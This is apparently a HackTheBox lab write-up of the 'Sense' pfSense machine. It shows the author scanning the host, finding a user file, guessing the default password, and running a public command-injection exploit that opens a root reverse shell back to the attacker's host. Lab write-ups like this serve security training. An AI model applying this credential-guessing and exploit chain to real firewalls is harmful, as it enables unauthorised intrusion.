---
private: 'false'
layout: post
featured: false
published: true
comments: true
modified: 2018-03-25
date: 2018-03-25
title: Writeup Hackthebox - Sense
tags: [hackthebox]
mathjax: false
imagefeature: 
description: Writeup Hackthebox - Sense
category: Hackthebox
chart: null
---


## Machine Detail
---
**Name :** Sense<br>
**IP :** 10.10.10.60<br>
**Author :** lkys37en<br>
**Hostname :** sense.htb<br>
**OS :** FreeBSD <img src="/images/os/freebsd.png" alt="FreeBSD" style="width: 20px;"/><br>



## Discovery
---

Port | Service | Version
--- | --- | ---
*80* | http | Apache httpd 2.4.10 ((Debian))
*443*  | ssl/http | Apache httpd 2.4.25 ((Ubuntu))

<br/>
## Exploitation
---

Scanning using nmap give us information about 2 ports is opened with same services running
which is PfSense, we need to login first to access the system trying default user for PfSense `admin:pfsense` without luck.

![PfSense](/images/valentine/pfsense.png)

So we need to find public exploit about pfsense I using `seachsploit`

```
•% ➜ searchsploit pfsense
------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                          |  Path
                                                                                                                        | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
pfSense - 'interfaces.php?if' Cross-Site Scripting                                                                      | exploits/hardware/remote/35071.txt
pfSense - 'pkg.php?xml' Cross-Site Scripting                                                                            | exploits/hardware/remote/35069.txt
pfSense - 'pkg_edit.php?id' Cross-Site Scripting                                                                        | exploits/hardware/remote/35068.txt
pfSense - 'status_graph.php?if' Cross-Site Scripting                                                                    | exploits/hardware/remote/35070.txt
pfSense - Authenticated Group Member Remote Command Execution (Metasploit)                                              | exploits/unix/remote/43193.rb
pfSense 2 Beta 4 - 'graph.php' Multiple Cross-Site Scripting Vulnerabilities                                            | exploits/php/remote/34985.txt
pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / Remote Command Execution                            | exploits/php/webapps/23901.txt
pfSense 2.1 build 20130911-1816 - Directory Traversal                                                                   | exploits/php/webapps/31263.txt
pfSense 2.2 - Multiple Vulnerabilities                                                                                  | exploits/php/webapps/36506.txt
pfSense 2.2.5 - Directory Traversal                                                                                     | exploits/php/webapps/39038.txt
pfSense 2.3.1_1 - Command Execution                                                                                     | exploits/php/webapps/43128.txt
pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Forgery                                                       | exploits/php/webapps/41501.txt
pfSense 2.4.1 - Cross-Site Request Forgery Error Page Clickjacking (Metasploit)                                         | exploits/php/remote/43341.rb
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                          | exploits/php/webapps/43560.py
pfSense Community Edition 2.2.6 - Multiple Vulnerabilities                                                              | exploits/php/webapps/39709.txt
pfSense Firewall 2.2.5 - Config File Cross-Site Request Forgery                                                         | exploits/php/webapps/39306.html
pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery                                                            | exploits/php/webapps/39695.txt
pfSense UTM Platform 2.0.1 - Cross-Site Scripting                                                                       | exploits/freebsd/webapps/24439.txt
------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

Almost all the exploitation requre us to authenticated first, we didn't have any account yet 
so we brutefoce directory using dirbuster and get this result

```
https://10.10.10.60/changelog.txt
https://10.10.10.60/index.php
https://10.10.10.60/installer/
https://10.10.10.60/tree/
https://10.10.10.60/csrf/
https://10.10.10.60/javascript/
https://10.10.10.60/system-users.txt
```

the interesting files is `changelog.txt` and `system-users.txt`, this is the content of changelog.txt

```
# Security Changelog

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

so the first clue is this machine still vulnerable from public exploit, 
and system-users.txt content is

```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

we got a username `Rohit` to login to but what the password is ? I just guessing 
same with pfsense default user password which is `pfsense` then
I try to login with user: Rohit pass: pfsense but still got incorrect password
after trying to change the username to all lowercase we can successfuly loggedin
with user: rohit pass: pfsense 

(￣ε￣＠)

after authenticated now we can use the exploit which require us to authenticated first,
I try the latest vulnerability published in 2018-01-12 `CVE : CVE-2014-4688`

```
python3 43560.py --username=rohit --password=pfsense --lhost=10.10.14.43 --lport=6969 --rhost=10.10.10.60
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# cat /root/root.txt
d08c32a5d[Redacted]b51a69f1a86
# ls /home/
.snap
rohit
# ls /home/rohit
.tcshrc
user.txt
# cat /home/rohit/user.txt
8721327c[Redacted]b40d27d9c17e7348b#
```

After running the exploit we got a root shell ٩(◕‿◕｡)۶ 

